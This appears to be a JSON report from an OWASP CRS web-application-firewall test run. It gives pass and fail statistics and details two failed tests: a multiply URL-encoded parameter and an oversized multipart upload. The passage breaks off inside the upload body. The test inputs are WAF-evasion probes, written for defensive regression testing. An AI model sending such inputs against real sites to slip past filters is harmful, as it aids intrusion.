{
  "global_stats" : {
    "failure_percentage" : 1.3635256878500122,
    "passing_percentage" : 98.63647431214999,
    "total_tests" : 4107,
    "success_tests" : 4051,
    "failure_tests" : 56
  },
  "time_stats" : {
    "calls" : 4107,
    "total_time_ms" : 59821,
    "min_time_ns" : 593875,
    "min_time_ms" : 0,
    "max_time_ms" : 4609,
    "avg_time_ms" : 14
  },
  "test_failures" : [ {
    "test_rule" : "920230",
    "test_id" : 2,
    "test_path" : "REQUEST-920-PROTOCOL-ENFORCEMENT/920230.yaml",
    "description" : "--",
    "cause" : "failed no_expect_ids check: 920230 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920230 - Multiple URL Encoding Detected", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 2,
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "uri" : "/?parm=%7%6F%6D%65%74%65%78%74%5F%31%32%33%",
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Language" : "en-us,en;q=0.5",
            "Keep-Alive" : "300",
            "Proxy-Connection" : "keep-alive"
          },
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 920230 ]
          }
        }
      } ]
    },
    "tested_rule" : [ "SecRule ARGS \"@rx %[0-9a-fA-F]{2}\" \"id:920230,\\\n  phase:2,\\\n  block,\\\n  t:none,\\\n  msg:'Multiple URL Encoding Detected',\\\n  logdata:'%{MATCHED_VAR}',\\\n  tag:'application-multi',\\\n  tag:'language-multi',\\\n  tag:'platform-multi',\\\n  tag:'attack-protocol',\\\n  tag:'paranoia-level/2',\\\n  tag:'OWASP_CRS',\\\n  tag:'OWASP_CRS/PROTOCOL-ENFORCEMENT',\\\n  tag:'capec/1000/255/153/267/120',\\\n  ver:'OWASP_CRS/4.22.0-dev',\\\n  severity:'WARNING',\\\n  setvar:'tx.inbound_anomaly_score_pl2=+%{tx.warning_anomaly_score}'\"" ]
  }, {
    "test_rule" : "920410",
    "test_id" : 1,
    "test_path" : "REQUEST-920-PROTOCOL-ENFORCEMENT/920410.yaml",
    "description" : "--",
    "cause" : "failed expect_id check: 920410 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920400 - Uploaded file size too large", "phase=2 rule_id=920120 - Attempted multipart/form-data bypass", "phase=2 rule_id=920121 - Attempted multipart/form-data bypass", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 1,
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "POST",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Content-Type" : "multipart/form-data; boundary=--------111111"
          },
          "uri" : "/",
          "data" : "----------111111\nContent-Disposition: form-data; name=\"bigfile\"; filename=\"file=.txt\"\nContent-Type: text/plain\n\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n1111111111111111111111111111111111111111111111111111111111111111111111111111\n111111111111111111111111111111111111111111111111111111111